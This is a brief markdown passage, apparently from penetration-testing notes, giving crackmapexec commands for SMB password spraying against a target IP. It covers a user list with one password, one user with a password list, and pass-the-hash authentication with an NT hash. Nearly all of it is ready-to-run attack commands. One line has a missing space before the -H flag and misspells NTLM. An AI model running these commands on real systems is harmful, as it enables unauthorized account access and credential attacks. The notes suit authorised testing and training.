## Miscellaneous Attacks In No Particular Order

**SMB Password Spraying**

When You have a working password and a list of userames, or a working username and a list of passwords, ``crackmapexec`` makes testing your credentials trivial.

```bash
crackmapexec smb <IP> -u <USERLIST> -p '<PASS>' --continue-on-success
crackmapexec smb <IP> -u '<USER>' -p <PASSLIST> --continue-on-success
# Authenticate with an NT hash
crackmapexec smb <IP> -u '<USER>'-H '<NTML_HASH>' --continue-on-success 
```
